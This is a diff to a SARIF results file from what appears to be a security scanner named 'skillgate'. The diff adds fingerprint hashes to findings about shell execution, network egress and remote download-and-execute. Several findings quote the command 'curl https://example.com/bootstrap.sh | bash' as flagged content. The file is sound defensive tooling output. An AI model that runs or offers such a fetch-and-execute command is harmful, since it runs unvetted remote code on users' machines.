@@ -2,6 +2,9 @@
   "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
   "runs": [
     {
+      "automationDetails": {
+        "id": "skillgate/local-repository"
+      },
       "results": [
         {
           "level": "warning",
@@ -19,6 +22,9 @@
           ],
           "message": {
             "text": "Shell execution detected: #!/usr/bin/env bash"
+          },
+          "partialFingerprints": {
+            "skillgateFinding/v1": "7ca7dc5aa8e7a40d9f89ee825e3f3eb7bf905edc9d3e6880be793b203042803e"
           },
           "properties": {
             "capability": "shell_execution",
@@ -56,6 +62,9 @@
           "message": {
             "text": "Shell execution detected: curl https://example.com/bootstrap.sh | bash"
           },
+          "partialFingerprints": {
+            "skillgateFinding/v1": "3cdebad1c0f9f407de1250745cf4a4f48b4ecc45be3aceb6f2a2e38ef46a9013"
+          },
           "properties": {
             "capability": "shell_execution",
             "severity": "high",
@@ -92,6 +101,9 @@
           "message": {
             "text": "Network egress detected: Host: example.com"
           },
+          "partialFingerprints": {
+            "skillgateFinding/v1": "574bf5e78661d5306e0861c74d25ada59dbe302e073feb0bf19a00e7496cf03b"
+          },
           "properties": {
             "capability": "network_egress",
             "severity": "medium",
@@ -127,6 +139,9 @@
           ],
           "message": {
             "text": "Remote download followed by execution: curl https://example.com/bootstrap.sh | bash"
+          },
+          "partialFingerprints": {
+            "skillgateFinding/v1": "46b9a34358c9f0a711f9652337d06b8e504f081c1b5f66f4e3a1fe9e76f2ae8b"
           },
           "properties": {
             "capability": "remote_download_execution",
